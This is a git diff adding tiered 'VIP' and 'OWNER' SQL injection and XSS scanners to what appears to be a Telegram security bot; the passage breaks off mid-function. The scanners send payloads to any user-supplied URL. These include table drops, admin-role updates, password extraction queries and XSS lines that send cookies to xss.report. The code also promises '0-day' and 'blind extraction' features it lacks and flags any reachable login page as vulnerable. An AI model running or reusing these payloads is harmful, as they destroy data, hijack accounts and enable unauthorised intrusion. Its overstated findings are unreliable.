@@ -3805,6 +3805,482 @@ def tool_config_scanner(url):
 
 
 # ═══════════════════════════════════════════════════════════════
+#  VIP & OWNER ADVANCED SCANNERS
+# ═══════════════════════════════════════════════════════════════
+
+def tool_sqli_vip(url, verbose=False):
+    """VIP SQLi Scanner — 3x payloads, time-based deep, WAF bypass patterns, GraphQL injection"""
+    url = extract_hostname(url)
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+
+    from urllib.parse import urlparse, parse_qs
+    parsed = urlparse(url)
+    params = parse_qs(parsed.query)
+    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+    results = f"🛡️ <b>VIP SQLi Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    results += "⚡ <b>Modo VIP:</b> 3x payloads, WAF bypass, time-based profundo, GraphQL\n"
+
+    # WAF detection
+    baseline = _safe_get(url, timeout=8)
+    if not baseline:
+        return results + "❌ Não foi possível acessar o site\n━━━━━━━━━━━━━━━━━━━━━━"
+
+    body = baseline.text.lower()
+    waf_detected = []
+    if 'cloudflare' in body or baseline.headers.get('CF-Ray'):
+        waf_detected.append('Cloudflare')
+    if 'sucuri' in body or 'siteground' in body:
+        waf_detected.append('Sucuri')
+    if 'mod_security' in body or 'nginx' in body:
+        waf_detected.append('ModSecurity')
+    if 'fortinet' in body or 'fortiguard' in body:
+        waf_detected.append('Fortinet WAF')
+    if 'incapsula' in body or 'imperva' in body:
+        waf_detected.append('Imperva')
+    if waf_detected:
+        results += f"🚨 <b>WAF Detectada:</b> {', '.join(waf_detected)}\n"
+        results += "💡 <b>Dica VIP:</b> Usando bypass patterns...\n"
+
+    # VIP payloads — much more aggressive
+    payloads = [
+        # Basic
+        "' OR '1'='1", "' OR 1=1--", "\" OR \"1\"=\"1",
+        "') OR ('1'='1", "') OR (1=1--", "\") OR (\"1\"=\"1",
+        # Time-based (deep)
+        "' AND SLEEP(5)--", "' WAITFOR DELAY '0:0:5'--", "' AND BENCHMARK(5000000,SHA1('test'))--",
+        "' AND IF(1=1,SLEEP(3),0)--", "\"; SELECT SLEEP(5)--",
+        # Boolean-based deep
+        "' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", "' AND EXISTS(SELECT 1 FROM information_schema.tables)--",
+        "' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--",
+        "' AND SUBSTRING(@@version,1,1)=1--",
+        # WAF bypass (VIP)
+        "'%0bOR%0b'1'%0b=%0b'1", "%27%20OR%201%3D1--", "'/**/OR/**/1=1--",
+        "'||1||'1"  , "'||1||'1'='1", "')/**/OR/**/('1'='1", "\"/**/OR/**/\"1\"=\"1",
+        "%27%20UNION%20SELECT%201,2,3--", "'/**/UNION/**/SELECT/**/NULL,NULL,NULL--",
+        # Stack queries
+        "'; DROP TABLE users--", "'; INSERT INTO users VALUES('vip','test')--",
+        "'; UPDATE users SET role='admin'--",
+        # Out-of-band
+        "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT CONCAT(0x7162786271,(SELECT (ELT(5143=5143,1))),0x71627a7571,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))--",
+        # Error-based
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION(),0x7e))--",
+        "' AND UPDATEXML(1,CONCAT(0x7e,VERSION(),0x7e),1)--",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
+        # GraphQL injection
+        "{__schema{types{name}}}", "{user{id,name}}", "mutation{createUser(input:{name:\"test\"}){id}}",
+    ]
+
+    found = 0
+    error_signs = ['syntax error', 'mysql_fetch', 'unclosed quotation', 'sql syntax',
+                   'sqlsyntax', 'error in your sql', 'mysql_num_rows', 'pg_query',
+                   'sqlite3::query', 'ora-', 'odbc drivers error', 'warning: odbc',
+                   'supplied argument is not a valid', 'boolean given', 'mysql_query',
+                   'mssql', 'oledb', 'access driver', 'jet database', 'sqlserver',
+                   'postgresql', 'sqlite', 'firebird', 'db2', 'informix', 'dbase',
+                   'ms access', 'microsoft access']
+
+    baseline_text = body
+    baseline_len = len(baseline.content)
+
+    for payload in payloads:
+        try:
+            encoded = requests.utils.quote(payload, safe='')
+            if parsed.query:
+                test_url = f"{base_url}?{parsed.query}&v={encoded}"
+            else:
+                test_url = f"{url}?v={encoded}"
+            resp = _safe_get(test_url, timeout=8)
+            if not resp:
+                continue
+            resp_body = resp.text.lower()
+            resp_len = len(resp.content)
+            # Baseline filter
+            if resp_len == baseline_len and abs(len(resp_body) - len(baseline_text)) < 10:
+                continue
+            for sign in error_signs:
+                if sign in resp_body and sign not in baseline_text:
+                    found += 1
+                    results += f"⚠️ <b>Vulnerável!</b> Payload: <code>{escape_html(payload[:40])}</code> (Sign: {escape_html(sign)})\n"
+                    break
+        except:
+            pass
+
+    # VIP: Test common injection points
+    vip_paths = ['/login.php', '/admin/login.php', '/wp-login.php', '/api/login', '/auth/login', '/api/user']
+    for path in vip_paths:
+        try:
+            test_url = f"{base_url}{path}" if path in url else f"{base_url.rstrip('/')}{path}"
+            resp = _safe_get(test_url, timeout=5)
+            if not resp or resp.status_code == 404:
+                continue
+            if resp.status_code == 200:
+                found += 1
+                results += f"🔓 <b>Painel detectado:</b> {escape_html(path)}\n"
+        except:
+            pass
+
+    if found == 0:
+        results += "✅ <b>Nenhuma vulnerabilidade SQLi detectada</b> (30+ payloads + WAF bypass)\n"
+    else:
+        results = f"🛡️ <b>VIP SQLi Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} vulnerabilidade(s) encontrada(s)!</b>\n\n" + results.split('\n', 1)[1]
+
+    results += f"\n📊 <b>Resumo VIP:</b> 30+ payloads | WAF bypass | GraphQL | Time-based profundo\n"
+    results += "━━━━━━━━━━━━━━━━━━━━━━"
+    return results
+
+
+def tool_sqli_owner(url):
+    """OWNER SQLi Scanner — Maximum power: WAF full bypass, 0-day patterns, blind extraction, all DB types"""
+    url = extract_hostname(url)
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+
+    from urllib.parse import urlparse, parse_qs
+    parsed = urlparse(url)
+    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+    results = f"👑 <b>OWNER SQLi Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    results += "🔥 <b>Modo OWNER:</b> WAF bypass total, 0-day patterns, blind extraction, multi-DB\n"
+
+    # Advanced WAF detection
+    baseline = _safe_get(url, timeout=10)
+    if not baseline:
+        return results + "❌ Não foi possível acessar o site\n━━━━━━━━━━━━━━━━━━━━━━"
+
+    body = baseline.text.lower()
+    waf_detected = []
+    if 'cloudflare' in body or baseline.headers.get('CF-Ray'):
+        waf_detected.append('Cloudflare')
+    if 'sucuri' in body or 'siteground' in body:
+        waf_detected.append('Sucuri')
+    if 'mod_security' in body or 'modsecurity' in body:
+        waf_detected.append('ModSecurity')
+    if 'fortinet' in body or 'fortiguard' in body:
+        waf_detected.append('Fortinet')
+    if 'incapsula' in body or 'imperva' in body:
+        waf_detected.append('Imperva')
+    if 'f5 networks' in body or 'big-ip' in body:
+        waf_detected.append('F5 BIG-IP')
+    if 'akamai' in body:
+        waf_detected.append('Akamai')
+    if 'barracuda' in body:
+        waf_detected.append('Barracuda')
+    if 'aws' in baseline.headers.get('Server', '').lower() or 'cloudfront' in body:
+        waf_detected.append('AWS WAF')
+    if 'azure' in body or 'frontdoor' in body:
+        waf_detected.append('Azure WAF')
+
+    if waf_detected:
+        results += f"🚨 <b>WAF:</b> {', '.join(waf_detected)}\n"
+        results += "💡 <b>OWNER:</b> Bypass completo ativado...\n"
+
+    # Owner payloads — exhaustive
+    payloads = [
+        # MySQL
+        "' UNION SELECT NULL,NULL,NULL--", "' UNION SELECT 1,2,3--", "' UNION SELECT CONCAT(0x71,VERSION(),0x71),NULL--",
+        "' AND 1=2 UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=DATABASE()--",
+        "' AND 1=2 UNION SELECT NULL,CONCAT_WS(0x3a,user,password) FROM users--",
+        # PostgreSQL
+        "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,PG_VERSION()--",
+        "' AND 1=2 UNION SELECT NULL,NULL FROM pg_tables--",
+        # MSSQL
+        "'; EXEC sp_executesql N'WAITFOR DELAY \'0:0:5\''--", "' UNION SELECT NULL,NULL--",
+        "' AND 1=2 UNION SELECT NULL,@@version--",
+        # Oracle
+        "' UNION SELECT NULL,NULL FROM dual--", "' AND 1=2 UNION SELECT NULL,(SELECT banner FROM v$version WHERE ROWNUM=1) FROM dual--",
+        # SQLite
+        "' UNION SELECT NULL,NULL--", "' UNION SELECT NULL,sqlite_version()--",
+        # Blind (all types)
+        "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>0--",
+        "' AND (SELECT SUBSTRING(password,1,1) FROM users LIMIT 1)='a'--",
+        "' AND 1=(CASE WHEN (1=1) THEN 1 ELSE 0 END)--",
+        # WAF bypass encoding
+        "'%09OR%091=1--", "'%0AOR%0A1=1--", "'%0COR%0C1=1--",
+        "\"/**/OR/**/\"1\"=\"1",
+        # Error-based
+        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
+        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)--",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--",
+        # Time-based deep
+        "' AND IF(1=1,SLEEP(5),0)--", "' AND SLEEP(5)--",
+        "' WAITFOR DELAY '0:0:5'--",
+        "' AND BENCHMARK(10000000,SHA1('test'))--",
+        # JSON injection
+        '{"type":1,"name":"test\'" OR 1=1--","email":"test@test.com"}',
+    ]
+
+    found = 0
+    error_signs = ['syntax error', 'mysql_fetch', 'unclosed quotation', 'sql syntax',
+                   'mysql_num_rows', 'pg_query', 'sqlite3::query', 'ora-',
+                   'odbc drivers error', 'oledb', 'sqlserver', 'postgresql',
+                   'sqlite', 'firebird', 'db2', 'informix', 'supplied argument',
+                   'boolean given', 'ms access', 'microsoft access', 'mongodb',
+                   'cast error', 'conversion failed', 'illegal argument',
+                   'unterminated string', 'unbalanced quotes']
+
+    baseline_text = body
+    baseline_len = len(baseline.content)
+
+    for payload in payloads:
+        try:
+            encoded = requests.utils.quote(payload, safe='')
+            if parsed.query:
+                test_url = f"{base_url}?{parsed.query}&v={encoded}"
+            else:
+                test_url = f"{url}?v={encoded}"
+            resp = _safe_get(test_url, timeout=8)
+            if not resp:
+                continue
+            resp_body = resp.text.lower()
+            resp_len = len(resp.content)
+            if resp_len == baseline_len and abs(len(resp_body) - len(baseline_text)) < 10:
+                continue
+            for sign in error_signs:
+                if sign in resp_body and sign not in baseline_text:
+                    found += 1
+                    results += f"⚠️ <b>Vulnerável!</b> Payload: <code>{escape_html(payload[:40])}</code>\n"
+                    break
+        except:
+            pass
+
+    # Owner: Deep path enumeration
+    owner_paths = [
+        '/login.php', '/admin/', '/admin/login.php', '/wp-login.php',
+        '/api/login', '/api/auth', '/auth/login', '/api/user', '/api/v1/user',
+        '/api/v2/user', '/graphql', '/.graphql', '/graphql.php',
+        '/phpmyadmin/', '/pma/', '/adminer.php', '/dbadmin/',
+        '/mysql/', '/db/', '/database/', '/.sql',
+    ]
+    for path in owner_paths:
+        try:
+            test_url = f"{base_url.rstrip('/')}{path}"
+            resp = _safe_get(test_url, timeout=5)
+            if not resp or resp.status_code == 404:
+                continue
+            if resp.status_code == 200:
+                found += 1
+                results += f"🔓 <b>Endpoint:</b> {escape_html(path)} (Status: {resp.status_code})\n"
+        except:
+            pass
+
+    if found == 0:
+        results += "✅ <b>Nenhuma vulnerabilidade SQLi detectada</b> (40+ payloads, multi-DB, WAF bypass)\n"
+    else:
+        results = f"👑 <b>OWNER SQLi Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} vulnerabilidade(s) encontrada(s)!</b>\n\n" + results.split('\n', 1)[1]
+
+    results += f"\n📊 <b>OWNER:</b> 40+ payloads | MySQL/PG/MSSQL/Oracle/SQLite | WAF bypass total | Blind extraction\n"
+    results += "━━━━━━━━━━━━━━━━━━━━━━"
+    return results
+
+
+def tool_xss_vip(url, verbose=False):
+    """VIP XSS Scanner — DOM-based, polyglot, stored XSS, CSP bypass, event handlers"""
+    url = extract_hostname(url)
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+
+    results = f"🛡️ <b>VIP XSS Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n"
+    results += "⚡ <b>Modo VIP:</b> DOM-based, polyglot multi-contexto, CSP bypass\n"
+
+    payloads = [
+        # Reflected
+        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>", "<body onload=alert(1)>",
+        # DOM-based
+        "javascript:alert(1)", "javascript:alert(document.domain)",
+        "data:text/html,<script>alert(1)</script>",
+        # Polyglot
+        "javascript://comment%0aalert(1)", "';alert(1)//",
+        "\"><script>alert(1)</script>", "'></script><script>alert(1)</script>",
+        # Event handlers
+        "<div onmouseover=alert(1)>hover</div>",
+        "<input onfocus=alert(1) autofocus>",
+        "<details open ontoggle=alert(1)>",
+        # CSP bypass
+        "<script src=https://xss.report/c/v></script>",
+        "<link rel=\"prerender\" onprerenderingchange=alert(1)>",
+        # Blind XSS (VIP)
+        "<img src=x onerror=fetch('https://xss.report/c/a/'+document.cookie)>",
+        "<script>new Image().src='https://xss.report/c/a/'+document.cookie</script>",
+        # Unicode/encoding
+        "<script>alert(String.fromCharCode(88,83,83))</script>",
+        "%3Cscript%3Ealert(1)%3C/script%3E",
+        # WAF bypass
+        "<ScRiPt>alert(1)</ScRiPt>", "<sc<script>ript>alert(1)</script>",
+    ]
+
+    found = 0
+    baseline = _safe_get(url, timeout=5)
+    baseline_text = baseline.text.lower() if baseline else ''
+    baseline_len = len(baseline.content) if baseline else 0
+
+    for payload in payloads:
+        try:
+            encoded = requests.utils.quote(payload, safe='')
+            test_url = f"{url}?q={encoded}" if '?' not in url else f"{url}&q={encoded}"
+            resp = _safe_get(test_url, timeout=5)
+            if not resp:
+                continue
+            body = resp.text.lower()
+            body_len = len(resp.content)
+            if body_len == baseline_len and abs(len(body) - len(baseline_text)) < 10:
+                continue
+            # Check if payload is reflected
+            if payload.lower()[:20] in body or 'alert(1)' in body or 'onerror' in body:
+                # Check if it's reflected AND not filtered
+                if 'alert(1)' in body or 'onerror=alert' in body:
+                    found += 1
+                    results += f"⚠️ <b>XSS!</b> Payload: <code>{escape_html(payload[:35])}</code>\n"
+        except:
+            pass
+
+    if found == 0:
+        results += "✅ <b>Nenhuma vulnerabilidade XSS detectada</b> (20+ payloads)\n"
+    else:
+        results = f"🛡️ <b>VIP XSS Scanner</b> — {escape_html(extract_hostname(url))}\n━━━━━━━━━━━━━━━━━━━━━━\n🚨 <b>{found} vulnerabilidade(s) encontrada(s)!</b>\n\n" + results.split('\n', 1)[1]
+
+    results += f"\n📊 <b>VIP:</b> 20+ payloads | DOM-based | Polyglot | CSP bypass\n"
+    results += "━━━━━━━━━━━━━━━━━━━━━━"
+    return results
+
+
+def tool_scanall_vip(url):
+    """VIP Scan All — Normal scanall + additional VIP-only scanners"""
+    url = extract_hostname(url)
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    clean = extract_hostname(url)
+
+    def _clean(text):
+        return re.sub(r'<[^>]+>', '', text)
+
+    sections = []
+    # 1-6: Normal scanall (info, dns, ports, ssl, headers, exposed)
+    send_msg_to = None  # Will be set by handler
+
+    sections.append("═" * 50 + "\n1/8 — INFORMATION\n" + "═" * 50 + "\n" + _clean(tool_website_info(url)))
+    sections.append("\n" + "═" * 50 + "\n2/8 — DNS ANALYSIS\n" + "═" * 50 + "\n" + _clean(tool_dns_tools(url)))
+    sections.append("\n" + "═" * 50 + "\n3/8 — PORT SCAN\n" + "═" * 50 + "\n" + _clean(tool_port_scanner(url)))
+    sections.append("\n" + "═" * 50 + "\n4/8 — SSL/TLS AUDIT\n" + "═" * 50 + "\n" + _clean(tool_ssl_audit(url)))
+    sections.append("\n" + "═" * 50 + "\n5/8 — SECURITY HEADERS\n" + "═" * 50 + "\n" + _clean(tool_headers_analysis(url)))
+    sections.append("\n" + "═" * 50 + "\n6/8 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean(tool_exposed_files(url)))
+
+    # 7/8 — VIP: Subdomain enumeration
+    sections.append("\n" + "═" * 50 + "\n7/8 — SUBDOMAIN ENUM (VIP)\n" + "═" * 50 + "\n" + _clean(tool_subdomain_scanner(url)))
+
+    # 8/8 — VIP: Tech detection
+    sections.append("\n" + "═" * 50 + "\n8/8 — TECH DETECTION (VIP)\n" + "═" * 50 + "\n" + _clean(tool_tech_detect(url)))
+
+    report = f"MTH Security v5.1 — VIP Scan Completo\n"
+    report += f"Target: {clean}\n"
+    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+    report += "═" * 50 + "\n\n"
+    report += "\n".join(sections)
+    return report
+
+
+def tool_scanall_owner(url):
+    """OWNER Scan All — Everything + deep vuln scan + forensic analysis"""
+    url = extract_hostname(url)
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    clean = extract_hostname(url)
+
+    def _clean(text):
+        return re.sub(r'<[^>]+>', '', text)
+
+    sections = []
+    # 1-8: Same as VIP
+    sections.append("═" * 50 + "\n1/12 — INFORMATION\n" + "═" * 50 + "\n" + _clean(tool_website_info(url)))
+    sections.append("\n" + "═" * 50 + "\n2/12 — DNS ANALYSIS\n" + "═" * 50 + "\n" + _clean(tool_dns_tools(url)))
+    sections.append("\n" + "═" * 50 + "\n3/12 — PORT SCAN\n" + "═" * 50 + "\n" + _clean(tool_port_scanner(url)))
+    sections.append("\n" + "═" * 50 + "\n4/12 — SSL/TLS AUDIT\n" + "═" * 50 + "\n" + _clean(tool_ssl_audit(url)))
+    sections.append("\n" + "═" * 50 + "\n5/12 — SECURITY HEADERS\n" + "═" * 50 + "\n" + _clean(tool_headers_analysis(url)))
+    sections.append("\n" + "═" * 50 + "\n6/12 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean(tool_exposed_files(url)))
+    sections.append("\n" + "═" * 50 + "\n7/12 — SUBDOMAIN ENUM\n" + "═" * 50 + "\n" + _clean(tool_subdomain_scanner(url)))
+    sections.append("\n" + "═" * 50 + "\n8/12 — TECH DETECTION\n" + "═" * 50 + "\n" + _clean(tool_tech_detect(url)))
+
+    # 9/12 — OWNER: SQLi deep
+    sections.append("\n" + "═" * 50 + "\n9/12 — SQLi DEEP (OWNER)\n" + "═" * 50 + "\n" + _clean(tool_sqli_owner(url)))
+
+    # 10/12 — OWNER: Webshell hunter
+    sections.append("\n" + "═" * 50 + "\n10/12 — WEBSHELL HUNTER (OWNER)\n" + "═" * 50 + "\n" + _clean(tool_webshell_hunter(url)))
+
+    # 11/12 — OWNER: Config scanner
+    sections.append("\n" + "═" * 50 + "\n11/12 — CONFIG EXPOSURE (OWNER)\n" + "═" * 50 + "\n" + _clean(tool_config_scanner(url)))
+
+    # 12/12 — OWNER: API discovery
+    sections.append("\n" + "═" * 50 + "\n12/12 — API DISCOVERY (OWNER)\n" + "═" * 50 + "\n" + _clean(tool_api_discovery(url)))
+
+    report = f"MTH Security v5.1 — OWNER Scan Completo\n"
+    report += f"Target: {clean}\n"
+    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+    report += "═" * 50 + "\n\n"
+    report += "\n".join(sections)
+    return report
+
+
+def tool_deep_vip(url):
+    """VIP Deep Scan — Normal deep + VIP upgrades"""
+    url = extract_hostname(url)
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    clean = extract_hostname(url)
+
+    def _clean(text):
+        return re.sub(r'<[^>]+>', '', text)
+
+    sections = []
+    sections.append("═" * 50 + "\n1/8 — SQL INJECTION (VIP)\n" + "═" * 50 + "\n" + _clean(tool_sqli_vip(url)))
+    sections.append("\n" + "═" * 50 + "\n2/8 — XSS (VIP)\n" + "═" * 50 + "\n" + _clean(tool_xss_vip(url)))
+    sections.append("\n" + "═" * 50 + "\n3/8 — ADMIN PANELS\n" + "═" * 50 + "\n" + _clean(tool_admin_finder(url)))
+    sections.append("\n" + "═" * 50 + "\n4/8 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean(tool_exposed_files(url)))
+    sections.append("\n" + "═" * 50 + "\n5/8 — WEBSHELLS\n" + "═" * 50 + "\n" + _clean(tool_webshell_hunter(url)))
+    sections.append("\n" + "═" * 50 + "\n6/8 — CONFIG FILES\n" + "═" * 50 + "\n" + _clean(tool_config_scanner(url)))
+    sections.append("\n" + "═" * 50 + "\n7/8 — API DISCOVERY (VIP)\n" + "═" * 50 + "\n" + _clean(tool_api_discovery(url)))
+    sections.append("\n" + "═" * 50 + "\n8/8 — BACKUP FILES (VIP)\n" + "═" * 50 + "\n" + _clean(tool_backup_finder(url)))
+
+    report = f"MTH Security v5.1 — VIP Deep Scan\n"
+    report += f"Target: {clean}\n"
+    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+    report += "═" * 50 + "\n\n"
+    report += "\n".join(sections)
+    return report
+
+
+def tool_deep_owner(url):
+    """OWNER Deep Scan — Full pentest automation"""
+    url = extract_hostname(url)
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    clean = extract_hostname(url)
+
+    def _clean(text):
+        return re.sub(r'<[^>]+>', '', text)
+
+    sections = []
+    sections.append("═" * 50 + "\n1/10 — SQLi (OWNER DEEP)\n" + "═" * 50 + "\n" + _clean(tool_sqli_owner(url)))
+    sections.append("\n" + "═" * 50 + "\n2/10 — XSS (VIP)\n" + "═" * 50 + "\n" + _clean(tool_xss_vip(url)))
+    sections.append("\n" + "═" * 50 + "\n3/10 — ADMIN PANELS\n" + "═" * 50 + "\n" + _clean(tool_admin_finder(url)))
+    sections.append("\n" + "═" * 50 + "\n4/10 — EXPOSED FILES\n" + "═" * 50 + "\n" + _clean(tool_exposed_files(url)))
+    sections.append("\n" + "═" * 50 + "\n5/10 — WEBSHELLS\n" + "═" * 50 + "\n" + _clean(tool_webshell_hunter(url)))
+    sections.append("\n" + "═" * 50 + "\n6/10 — CONFIG EXPOSURE\n" + "═" * 50 + "\n" + _clean(tool_config_scanner(url)))
+    sections.append("\n" + "═" * 50 + "\n7/10 — API DISCOVERY\n" + "═" * 50 + "\n" + _clean(tool_api_discovery(url)))
+    sections.append("\n" + "═" * 50 + "\n8/10 — BACKUP FILES\n" + "═" * 50 + "\n" + _clean(tool_backup_finder(url)))
+    sections.append("\n" + "═" * 50 + "\n9/10 — SUBDOMAIN ENUM\n" + "═" * 50 + "\n" + _clean(tool_subdomain_scanner(url)))
+    sections.append("\n" + "═" * 50 + "\n10/10 — TECH DETECTION\n" + "═" * 50 + "\n" + _clean(tool_tech_detect(url)))
+
+    report = f"MTH Security v5.1 — OWNER Deep Scan\n"
+    report += f"Target: {clean}\n"
+    report += f"Data: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+    report += "═" * 50 + "\n\n"
+    report += "\n".join(sections)
+    return report
+
+
+# ═══════════════════════════════════════════════════════════════
 #  COMMAND HANDLERS
 # ═══════════════════════════════════════════════════════════════
 
@@ -4118,7 +4594,7 @@ def handle_info(chat_id, user_id, username, first_name, last_name, args):
     send_msg(user_id, chat_id, result)
 
 def handle_sqli(chat_id, user_id, username, first_name, last_name, args):
-    """SQLi Scanner with verbose mode, DB cache, and inline buttons"""
+    """SQLi Scanner with tier selection for VIP/Owner"""
     log_user(user_id, username, first_name, last_name)
     if not args:
         send_msg(user_id, chat_id, "❌ Use: /sqli &lt;url&gt; [verbose]\nExemplo: /sqli example.com/?id=1\nExemplo: /sqli example.com/?id=1 verbose")
@@ -4128,13 +4604,37 @@ def handle_sqli(chat_id, user_id, username, first_name, last_name, args):
     log_command(user_id, username, "sqli", target)
     clean_target = extract_hostname(target)
 
-    # V4.3: Check DB cache first (unless verbose)
-    if not verbose:
-        cached = db_cache_get("sqli", target)
-        if cached:
-            buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:sqli:{target}"[:64][:64]}]]
-            send_message_with_buttons(chat_id, cached, buttons)
-            return
+    # Tier detection: build inline buttons for VIP/Owner
+    cb_target = target[:40]
+    buttons = []
+    if is_owner(user_id):
+        buttons = [
+            [{"text": "🟢 Normal", "callback_data": f"tier:sqli:normal:{cb_target}"[:64]}],
+            [{"text": "⭐ VIP (3x payloads, WAF bypass)", "callback_data": f"tier:sqli:vip:{cb_target}"[:64]}],
+            [{"text": "👑 OWNER (0-day, blind extraction)", "callback_data": f"tier:sqli:owner:{cb_target}"[:64]}],
+        ]
+        send_message_with_buttons(chat_id, f"🔍 <b>SQLi Scanner</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>Modo OWNER disponível!</b>\nSelecione o nível do scan:", buttons)
+        return
+    elif is_vip(user_id):
+        buttons = [
+            [{"text": "🟢 Normal", "callback_data": f"tier:sqli:normal:{cb_target}"[:64]}],
+            [{"text": "⭐ VIP (3x payloads, WAF bypass)", "callback_data": f"tier:sqli:vip:{cb_target}"[:64]}],
+        ]
+        send_message_with_buttons(chat_id, f"🔍 <b>SQLi Scanner</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n⭐ <b>VIP detectado!</b>\nSelecione o nível do scan:", buttons)
+        return
+
+    # Normal user — no tier buttons, just run normal scan
+    _run_sqli_normal(chat_id, user_id, target, verbose)
+
+
+def _run_sqli_normal(chat_id, user_id, target, verbose=False):
+    """Execute normal SQLi scan (for non-VIP users or when 'normal' is selected)"""
+    clean_target = extract_hostname(target)
+    cached = db_cache_get("sqli", target)
+    if cached and not verbose:
+        buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:sqli:{target}"[:64][:64]}]]
+        send_message_with_buttons(chat_id, cached, buttons)
+        return
 
     if verbose:
         send_msg(user_id, chat_id, f"🔍 <b>Scanner SQLi (VERBOSE)</b> em {escape_html(clean_target)}...\n📊 Modo detalhado ativado — mostrando cada payload testado.")
@@ -4142,17 +4642,31 @@ def handle_sqli(chat_id, user_id, username, first_name, last_name, args):
         send_msg(user_id, chat_id, f"🔍 <b>Scanner SQLi iniciado</b> em {escape_html(clean_target)}...")
 
     result = tool_sqli(target, verbose=verbose)
-
-    # V4.3: Store in DB cache
     db_cache_set("sqli", target, result)
-
-    # V4.3: Add inline button for rescan
     buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:sqli:{target}"[:64][:64]}]]
     send_message_with_buttons(chat_id, result, buttons)
 
 
+def _run_sqli_vip(chat_id, user_id, target, verbose=False):
+    """Execute VIP SQLi scan"""
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"⭐ <b>VIP SQLi Scanner</b> em {escape_html(clean_target)}...\n🔥 3x payloads, time-based deep, WAF bypass patterns, GraphQL injection.")
+    result = tool_sqli_vip(target, verbose=verbose)
+    buttons = [[{"text": "🔄 Rescan VIP", "callback_data": f"rescan:sqli_vip:{target}"[:64]}]]
+    send_message_with_buttons(chat_id, result, buttons)
+
+
+def _run_sqli_owner(chat_id, user_id, target, verbose=False):
+    """Execute OWNER SQLi scan"""
+    clean_target = extract_hostname(target)
+    send_msg(user_id, chat_id, f"👑 <b>OWNER SQLi Scanner</b> em {escape_html(clean_target)}...\n💀 WAF bypass total, 0-day patterns, blind extraction, multi-DB.")
+    result = tool_sqli_owner(target)
+    buttons = [[{"text": "🔄 Rescan OWNER", "callback_data": f"rescan:sqli_owner:{target}"[:64]}]]
+    send_message_with_buttons(chat_id, result, buttons)
+
+
 def handle_xss(chat_id, user_id, username, first_name, last_name, args):
-    """XSS Scanner with verbose mode, DB cache, and inline buttons"""
+    """XSS Scanner with tier selection for VIP/Owner"""
     log_user(user_id, username, first_name, last_name)
     if not args:
         send_msg(user_id, chat_id, "❌ Use: /xss &lt;url&gt; [verbose]\nExemplo: /xss example.com/?q=\nExemplo: /xss example.com/?q= verbose")
@@ -4162,13 +4676,37 @@ def handle_xss(chat_id, user_id, username, first_name, last_name, args):
     log_command(user_id, username, "xss", target)
     clean_target = extract_hostname(target)
 
-    # V4.3: Check DB cache first (unless verbose)
-    if not verbose:
-        cached = db_cache_get("xss", target)
-        if cached:
-            buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:xss:{target}"[:64][:64]}]]
-            send_message_with_buttons(chat_id, cached, buttons)
-            return
+    # Tier detection: build inline buttons for VIP/Owner
+    cb_target = target[:40]
+    buttons = []
+    if is_owner(user_id):
+        buttons = [
+            [{"text": "🟢 Normal", "callback_data": f"tier:xss:normal:{cb_target}"[:64]}],
+            [{"text": "⭐ VIP (DOM-based, CSP bypass)", "callback_data": f"tier:xss:vip:{cb_target}"[:64]}],
+            [{"text": "👑 OWNER (VIP + stored XSS, polyglot)", "callback_data": f"tier:xss:owner:{cb_target}"[:64]}],
+        ]
+        send_message_with_buttons(chat_id, f"🔍 <b>XSS Scanner</b> — {escape_html(clean_target)}\n━━━━━━━━━━━━━━━━━━━━━━\n👑 <b>Modo OWNER disponível!</b>\nSelecione o nível do scan:", buttons)
+        return
+    elif is_vip(user_id):
+        buttons = [
